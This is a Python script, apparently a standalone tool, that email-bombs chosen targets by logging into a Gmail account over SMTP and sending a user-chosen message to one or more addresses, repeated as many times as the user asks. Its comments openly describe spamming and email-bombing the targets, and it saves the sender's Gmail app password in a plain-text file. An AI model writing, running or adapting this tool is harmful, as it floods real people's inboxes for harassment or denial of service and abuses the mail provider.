# Built-in library's.
import smtplib
from os import path, mkdir

from utils import email_validation, other_methods, user_input

print(f"{open('Welcome/welcome.txt', encoding='UTF-8').read()}\n\n")  # Welcomes user.

# User inputs
if not path.exists("User_Credentials"):  # If User_Credentials does not exist, asks for user credentials.
    # This is asking the user for their Gmail address and app password.
    while True:
        other_methods.clear()
        sender = input(
            "Enter the Gmail address you would like to send emails from (example@gmail.com) -> ")  # The gmail address that emails will be sent from e.g. example@gmail.com.
        if email_validation.isGmailValid(sender):
            app_password = input(
                "Enter the app's password (xxxx xxxx xxxx xxxx)-> ")  # The app's password that was created from the Gmail address e.g. alig maou tajh jagq.
            break
else:  # Otherwise, reads saved user credentials.
    sender = open("User_Credentials/sender.txt", "rt").read()  # Reads saved user gmail.
    app_password = open("User_Credentials/app_password.txt", "rt").read()  # Reads saved user app password.
print(
    "If you would like to spam more than one email, separate the emails by commas (example@gmail.com, example2@hotmail.com, example3@myspace.com)")  # Tells user how to email-bomb more than one email.
while True:
    receiver = input(
        "Specify the email(s) you would like to email-bomb -> ")  # Enter the email(s) that you would like to email-bomb.
    if email_validation.isEmailListValid(receiver):
        break
    else:
        continue
message = input("Enter your email-bomber message -> ")  # The message that the email user(s) will receive.
count = user_input.getIntInput("Enter a number for the amount of emails to be sent -> ")  # The amount of emails to be sent to the receiver(s).

# Server
server = smtplib.SMTP("smtp.gmail.com", 587)  # Initializes SMTP server.
server.starttls()  # Start SMTP server.

try:  # Attempts to log in to user's gmail account.
    server.login(user=sender, password=app_password)  # Logins to user's account.
except smtplib.SMTPAuthenticationError as error:  # Incorrect credentials inputted by user.
    print(
        "\nError:\nMake sure the Gmail address that you inputted is the same as the gmail account you have created an app password for.\nDouble check your Gmail and app password.")
    print(f"{error}")
    input("Enter to exit...")
    quit()  # Quits program.

if not path.exists("User_Credentials"):  # If user credentials does not exist, creates and saves credential files.
    # If there are no errors in credentials, save user information after SMTP verification.
    mkdir("User_Credentials")  # Creates User_Credentials folder.
    open("User_Credentials/sender.txt", "xt").write(
        sender)  # Creates and saves user's Gmail address to User_Credentials folder.
    open("User_Credentials/app_password.txt", "xt").write(
        app_password)  # Creates and saves user's Gmail app password to User_Credentials folder.
    input(
        "\nYour credentials have been saved, so you do not have to repeat this process.\nTo change your credentials, go to User_Credentials and change your file information.\nPress enter to continue...")

print("\nEmail-bomber has started...\n")

for i in range(count):  # Amount of messages to be sent.
    for email_receiver in receiver.split(","):  # Loops through emails to send emails to.
        server.sendmail(from_addr=sender, to_addrs=email_receiver, msg=message)  # Sends email to receiver.
        print(f"Email-bombing {email_receiver}...")

input("\nEmail-bomber was successful...\nEnter to exit...")  # Email-bomber finished.
server.close()  # Closes server.
